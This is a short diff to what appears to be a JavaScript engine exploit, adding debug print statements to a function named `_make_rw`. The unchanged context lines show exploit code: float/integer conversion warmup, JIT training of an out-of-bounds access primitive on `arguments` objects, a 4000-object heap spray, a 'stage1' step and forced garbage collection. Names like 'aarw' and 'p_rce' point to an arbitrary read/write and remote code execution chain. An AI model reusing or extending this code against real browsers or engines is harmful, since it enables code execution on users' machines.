@@ -17125,10 +17125,12 @@ async function _aarw_main() {
         })()
 
         async function _make_rw(p_rce, mk_stage1, verify = false) {
+            print("_make_rw: begin");
             for (let i = 0; i < 100000; ++i) {
                 _f2i(i);
                 _i2f(i);
             }
+            print("_make_rw: conversion warmup done");
 
             function getarg() {
                 return arguments;
@@ -17142,6 +17144,7 @@ async function _aarw_main() {
                 let invkr = [i,getarg(i,2,3,4)];
                 get_oob(invkr, 0);
             }
+            print("_make_rw: get_oob training done");
 
             let arrs = new Array(4000);
             for (let i = 0; i < 4000; ++i) {
@@ -17155,8 +17158,11 @@ async function _aarw_main() {
                 };
                 arrs[i] = obj;
             }
+            print("_make_rw: object spray done");
 
+            print("_make_rw: entering stage1 unit attempts");
             mk_stage1();
+            print("_make_rw: stage1 unit attempts done");
             // GC is fine now
             if (verify) _dgc(10000);
         }
